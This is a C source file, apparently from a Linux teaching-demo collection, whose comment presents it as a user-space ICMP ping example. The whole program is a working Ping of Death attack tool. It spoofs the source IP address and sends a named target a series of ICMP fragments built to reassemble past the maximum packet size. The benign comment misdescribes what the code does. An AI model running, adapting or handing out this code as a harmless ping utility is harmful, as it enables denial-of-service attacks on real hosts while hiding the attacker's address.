/*
 * This file is part of the demos-linux package.
 * Copyright (C) 2011-2023 Mark Veltzer <mark.veltzer@gmail.com>
 *
 * demos-linux is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * demos-linux is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with demos-linux. If not, see <http://www.gnu.org/licenses/>.
 */

#include <firstinclude.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <string.h>
#include <arpa/inet.h>
#include <stdlib.h>	// for exit(3), atoi(3), EXIT_SUCCESS, EXIT_FAILURE
#include <unistd.h>	// for close(2), usleep(3)
#include <err_utils.h>	// for CHECK_NOT_M1()

/*
 * An example of doing ICMP, in this case ping, in user space...
 *
 * References:
 * http://www.tenouk.com/Module43a.html
 */

int main(int argc, char** argv, char** envp) {
	char buf[400];
	struct ip *ip=(struct ip *)buf;
	struct icmphdr *icmp=(struct icmphdr *)(ip + 1);
	struct hostent *hp, *hp2;
	struct sockaddr_in dst;
	int offset;
	int num=100;
	if(argc !=4) {
		printf("%s: usage: %s [saddress] [dstaddress] [number]\n", argv[0], argv[0]);
		printf("- saddress is the spoofed source address\n");
		printf("- dstaddress is the target\n");
		printf("- number is the number of packets to send, 100 is the default\n");
		exit(EXIT_FAILURE);
	}
	/* Copy the packet number */
	num=atoi(argv[3]);
	/* Loop based on the packet number */
	for(int i=1; i<=num; i++) {
		int on=1;
		bzero(buf, sizeof(buf));
		/* Create RAW socket */
		int s=CHECK_NOT_M1(socket(AF_INET, SOCK_RAW, IPPROTO_RAW));
		/* socket options, tell the kernel we provide the IP structure */
		CHECK_NOT_M1(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)));
		if((hp=gethostbyname(argv[2]))==NULL) {
			ip->ip_dst.s_addr=CHECK_NOT_M1(inet_addr(argv[2]));
		} else
			bcopy(hp->h_addr_list[0], &ip->ip_dst.s_addr, hp->h_length);
		/* The following source address just redundant for target to collect */
		if((hp2=gethostbyname(argv[1]))==NULL) {
			ip->ip_src.s_addr=CHECK_NOT_M1(inet_addr(argv[1]));
		} else
			bcopy(hp2->h_addr_list[0], &ip->ip_src.s_addr, hp->h_length);
		printf("Sending to %s from spoofed %s\n", inet_ntoa(ip->ip_dst), argv[1]);
		/* Ip structure, check the ip.h */
		ip->ip_v=4;
		ip->ip_hl=sizeof(*ip) >> 2;
		ip->ip_tos=0;
		ip->ip_len=htons(sizeof(buf));
		ip->ip_id=htons(4321);
		ip->ip_off=htons(0);
		ip->ip_ttl=255;
		ip->ip_p=1;
		ip->ip_sum=0;	/* Let kernel fills in */

		dst.sin_addr=ip->ip_dst;
		dst.sin_family=AF_INET;

		icmp->type=ICMP_ECHO;
		icmp->code=0;
		/* Header checksum */
		icmp->checksum=htons(~(ICMP_ECHO << 8));
		for(offset=0; offset < 65536; offset+=(sizeof(buf) - sizeof(*ip))) {
			ip->ip_off=htons(offset >> 3);
			if(offset < 65120)
				ip->ip_off|=htons(0x2000);
			else
				ip->ip_len=htons(418);	/* make total 65538 */
			/* sending time */
			CHECK_NOT_M1(sendto(s, buf, sizeof(buf), 0, (struct sockaddr *)&dst, sizeof(dst)));
			printf("sendto() is OK.\n");
			/* IF offset=0, define our ICMP structure */
			if(offset==0) {
				icmp->type=0;
				icmp->code=0;
				icmp->checksum=0;
			}
		}
		/* close socket */
		CHECK_NOT_M1(close(s));
		CHECK_NOT_M1(usleep(30000));
	}
	return EXIT_SUCCESS;
}
